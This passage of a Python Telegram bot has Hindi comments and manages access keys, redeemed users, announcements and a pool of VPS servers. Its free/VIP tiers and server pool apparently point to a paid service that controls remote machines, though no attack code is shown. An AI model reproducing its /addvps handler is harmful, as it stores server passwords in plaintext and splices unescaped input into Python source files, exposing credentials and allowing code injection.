        if expiry_date:
            expiry_text = expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')
        else:
            expiry_text = "❌ EXPIRED"
    else:
        user_key = "❌ NO KEY"
        expiry_text = "N/A"

    info_text = f"""
👤 **User Info:**
🆔 **User ID:** `{user_id}`
🔹 **Username:** `{username}`
👑 **Admin:** {is_admin}
🎟 **Access:** {has_access}

🔑 **Key Details:**
🔹 **Key:** `{user_key}`
📅 **Expiry:** `{expiry_text}`
"""
    bot.reply_to(message, info_text, parse_mode="Markdown")

# ✅ /ANNOUNCE Command (Admin Only)
@bot.message_handler(commands=['announce'])
def announce_message(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split(maxsplit=1)
    if len(command) < 2:
        bot.reply_to(message, "⚠ USAGE: /announce <message>")
        return

    announcement = f"📢 **ANNOUNCEMENT:**\n{command[1]}"
    
    # ✅ Auto-Pin Announcement
    msg = bot.send_message(GROUP_ID, announcement, parse_mode="Markdown")
    bot.pin_chat_message(GROUP_ID, msg.message_id)

    # ✅ Auto-Delete After 2 Hours (7200 seconds)
    threading.Timer(7200, lambda: bot.delete_message(GROUP_ID, msg.message_id)).start()

    bot.reply_to(message, "✅ ANNOUNCEMENT SENT & PINNED!")

# add vps
@bot.message_handler(commands=['addvps'])
def add_vps(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠ USAGE: /addvps <IP> <USERNAME> <PASSWORD>")
        return

    ip, user, password = command[1], command[2], command[3]

    # VPS को free.py और vip.py में ऐड करें
    for filename in ["free.py", "vip.py"]:
        with open(filename, "r") as file:
            lines = file.readlines()

        # VPS लिस्ट खोजें और नया VPS जोड़ें
        for i, line in enumerate(lines):
            if "VPS_LIST = [" in line:
                lines.insert(i + 1, f'    {{"host": "{ip}", "user": "{user}", "password": "{password}"}},\n')
                break

        # फाइल को अपडेट करें
        with open(filename, "w") as file:
            file.writelines(lines)

    bot.reply_to(message, f"✅ NEW VPS ADDED!\n🌐 **IP:** `{ip}`\n👤 **User:** `{user}`", parse_mode="Markdown")

# /remove vps
@bot.message_handler(commands=['removevps'])
def remove_vps(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠ USAGE: /removevps <IP>")
        return

    ip_to_remove = command[1]
    removed = False

    for filename in ["free.py", "vip.py"]:
        with open(filename, "r") as file:
            lines = file.readlines()

        new_lines = [line for line in lines if f'"host": "{ip_to_remove}"' not in line]

        if len(new_lines) < len(lines):
            with open(filename, "w") as file:
                file.writelines(new_lines)
            removed = True

    if removed:
        bot.reply_to(message, f"✅ VPS `{ip_to_remove}` REMOVED SUCCESSFULLY!")
    else:
        bot.reply_to(message, f"❌ VPS `{ip_to_remove}` NOT FOUND!")

# checkvps
@bot.message_handler(commands=['checkvps'])
def check_vps(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    vps_list = []

    for filename in ["free.py", "vip.py"]:
        with open(filename, "r") as file:
            lines = file.readlines()

        for line in lines:
            if '"host":' in line:
                vps_list.append(line.strip())

    if vps_list:
        vps_info = "\n".join(vps_list)
        bot.reply_to(message, f"🔍 **ACTIVE VPS LIST:**\n```\n{vps_info}\n```", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ NO VPS FOUND!")

#redeemef user
@bot.message_handler(commands=['redeemed'])
def list_users(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    if not redeem_log:  # ✅ कोई Redeemed User नहीं है
        bot.reply_to(message, "❌ NO REDEEMED USERS FOUND!")
        return

    user_list = "📜 **REDEEMED USERS LIST:**\n\n"
    
    for user_id, user_key in redeem_log.items():
        try:
            user_info = bot.get_chat(user_id)
            first_name = user_info.first_name if user_info.first_name else "Unknown"
            username = f"@{user_info.username}" if user_info.username else "N/A"
        except Exception:
            first_name = "Unknown"
            username = "N/A"

        # ✅ अगर Key मौजूद है, तो Expiry डेट दिखाओ
        if user_key in keys:
            expiry_date = keys[user_key].strftime('%Y-%m-%d %H:%M:%S IST')
        else:
            expiry_date = "❌ EXPIRED"

        user_list += f"👤 **User:** {first_name} ({username})\n🆔 **User ID:** `{user_id}`\n🔑 **Key:** `{user_key}`\n📅 **Expiry:** `{expiry_date}`\n\n"

    bot.reply_to(message, user_list, parse_mode="Markdown")

#uptime bot✅
import time
START_TIME = time.time()  # बॉट स्टार्ट होने का टाइम सेट कर दो

@bot.message_handler(commands=['uptime'])
def uptime(message):
    uptime_seconds = int(time.time() - START_TIME)
    hours = uptime_seconds // 3600
    minutes = (uptime_seconds % 3600) // 60
    seconds = uptime_seconds % 60

    bot.reply_to(message, f"⏳ **BOT UPTIME:** `{hours}h {minutes}m {seconds}s`", parse_mode="Markdown")

@bot.message_handler(commands=['serverstatus'])
def server_status(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    cpu_usage = psutil.cpu_percent()
    ram_usage = psutil.virtual_memory().percent
    system_name = platform.system()
    system_version = platform.release()
    
    bot.reply_to(message, f"🖥 **SERVER STATUS:**\n⚙ **OS:** `{system_name} {system_version}`\n🟢 **CPU Usage:** `{cpu_usage}%`\n🔵 **RAM Usage:** `{ram_usage}%`", parse_mode="Markdown")

# ✅ /CHECK Command (List Active Keys)
@bot.message_handler(commands=['check'])
def check_keys(message):
    if str(message.chat.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    # ✅ पहले Expired Keys Remove करो
    remove_expired_users()

    if not keys:
        bot.reply_to(message, "❌ NO ACTIVE KEYS!")
        return

    key_list = "🔑 **ACTIVE KEYS:**\n"
    for key, expiry in keys.items():
        key_list += f"🔹 `{key}` - 📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S IST')}\n"

    bot.reply_to(message, key_list, parse_mode="Markdown")

def auto_clean_expired_keys():
    while True:
        remove_expired_users()
        time.sleep(30)  # हर 30 sec में Expired Keys Remove करेगा

# ✅ Expired Keys Auto-Remove System स्टार्ट करो
threading.Thread(target=auto_clean_expired_keys, daemon=True).start()

# ✅ Bot Polling (MAIN LOOP)
while True:
    try:
        bot.polling(none_stop=True, interval=0)
    except Exception as e:
        print(f"Polling Error: {e}")
        time.sleep(5)  # कुछ सेकंड wait करके फिर से start करेगा
